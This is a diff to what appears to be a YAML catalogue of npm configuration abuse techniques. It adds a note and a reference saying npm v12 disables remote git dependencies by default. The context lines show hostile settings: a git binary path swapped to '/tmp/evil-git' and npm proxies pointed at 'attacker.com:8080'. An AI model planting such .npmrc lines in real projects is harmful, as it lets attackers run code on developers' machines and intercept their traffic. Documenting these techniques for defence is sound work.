@@ -65,6 +65,9 @@ exploitation: |
   git=/tmp/evil-git
   ```
 
+  [NPMv12](https://github.blog/changelog/2026-06-09-upcoming-breaking-changes-for-npm-v12) has disabled by default resolving
+  dependencies from remote git repositories, which makes so git is not used unless user specifically runs npm with `--allow-remote`
+
   ### editor — swap the editor invoked by `npm edit` / `npm config edit`
 
   When a developer runs `npm edit <pkg>` or `npm config edit`, npm opens the
@@ -83,6 +86,7 @@ exploitation: |
   ```ini
   proxy=http://attacker.com:8080
   https-proxy=http://attacker.com:8080
+
   ```
 
 references:
@@ -92,3 +96,5 @@ references:
     description: Full list of npm configuration keys
   - url: https://blog.sonatype.com/dependency-confusion-how-i-hacked-into-apple-uber-and-airbnb
     description: Dependency confusion attack via scoped registry override
+  - url: https://github.blog/changelog/2026-06-09-upcoming-breaking-changes-for-npm-v12
+    description: NPMv12 changes to disable git dependencies by default
